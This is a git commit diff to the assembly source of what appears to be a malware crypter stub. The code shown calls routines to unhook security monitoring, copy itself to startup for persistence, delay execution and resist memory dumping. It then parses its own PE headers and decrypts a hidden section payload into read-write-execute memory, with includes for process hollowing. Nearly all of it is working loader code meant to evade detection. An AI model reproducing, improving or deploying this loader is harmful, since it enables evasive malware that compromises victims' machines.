2b5e8dfb6aee0267fdab6749d4b15a5a0b145c30
Xyris <01xyris@proton.me>
2024-11-18 23:49:01 +0100

    Update stub.asm

--- Stub/stub.asm
+++ Stub/stub.asm
@@ -1,44 +1,36 @@
 .386
 .model flat, stdcall
 option casemap:none
-
 include sup.Inc
 include AntiDump.asm
 include Unhook.asm
 include Startup.asm
 include ProcessHollowing.asm
 include Decrypt.asm
-
 .code
-
 Delay PROC time:DWORD
-	invoke lstrcmp, addr delay_check, addr sz_delay_check
-	.if eax == -1
-    	ret
-	.endif
+    invoke lstrcmp, addr delay_check, addr sz_delay_check
+    .if eax == -1
+        ret
+    .endif
     invoke Sleep, time
     ret
 Delay ENDP
-
-
-
 start PROC
     LOCAL hModule:DWORD
     LOCAL sectionData:DWORD
     LOCAL sectionSize:DWORD
     LOCAL execMemory:DWORD
     LOCAL hFile:HANDLE
-
+    
     invoke MessageBoxA, NULL, addr message_text, addr caption_text, MB_YESNO or MB_ICONWARNING
     cmp eax, IDNO
     je exit_error
-
+    
     invoke unhook
     invoke CopyToStartup
     invoke Delay, 20000
     invoke AntiDump
-    
-
     
     invoke GetModuleHandleA, NULL
     mov hModule, eax
@@ -46,41 +38,38 @@ start PROC
     jz exit_error
     
     mov ebx, eax
+    assume ebx:PTR IMAGE_DOS_HEADER
     
-    ; DOS MZ Header
-    mov ax, word ptr [ebx]            ; +00  (0) WORD e_magic Magic number MZ (5A4D)
-    cmp ax, 5A4Dh
+    movzx eax, word ptr [ebx].e_magic
+    cmp ax, IMAGE_DOS_SIGNATURE
     jne exit_error
     
-    mov edx, [ebx + 3Ch]             ; +3C  (60) DWORD e_lfanew File address of new exe header
+    mov edx, [ebx].e_lfanew
     add edx, ebx
+    assume edx:PTR IMAGE_NT_HEADERS
     
-    ; PE Header
-    mov eax, [edx]                   ; +00  (0) DWORD Signature PE (00004550h)
-    cmp eax, 00004550h
+    mov eax, [edx].Signature
+    cmp eax, IMAGE_NT_SIGNATURE
     jne exit_error
     
-    mov ax, [edx + 6]                ; +06  (6) WORD Number of Sections
-    test ax, ax
+    movzx ecx, word ptr [edx].FileHeader.NumberOfSections
+    test ecx, ecx
     jz exit_error
     
-    movzx ecx, ax
-    dec ecx
-    
-    ; Section Headers
-    add edx, 0F8h                    ; +F8  (248) Start of Section Headers
-    imul eax, ecx, 28h               ; +28  (40) Size of Section Header
+    sub ecx, 2
+    lea edx, [edx + sizeof IMAGE_NT_HEADERS]
+    imul eax, ecx, sizeof IMAGE_SECTION_HEADER
     add edx, eax
+    assume edx:PTR IMAGE_SECTION_HEADER
     
-    mov eax, [edx + 0Ch]             ; +0C  (12) DWORD VirtualAddress
+    mov eax, [edx].VirtualAddress
     add eax, hModule
     mov sectionData, eax
     
-    mov eax, [edx + 10h]             ; +10  (16) DWORD SizeOfRawData
+    mov eax, [edx].SizeOfRawData
     mov sectionSize, eax
     
-    invoke VirtualAlloc, NULL, sectionSize, \
-           MEM_COMMIT or MEM_RESERVE, PAGE_RWX
+    invoke VirtualAlloc, NULL, sectionSize, MEM_COMMIT or MEM_RESERVE, PAGE_RWX
     mov execMemory, eax
     
     invoke Decrypt, sectionData, sectionSize, execMemory
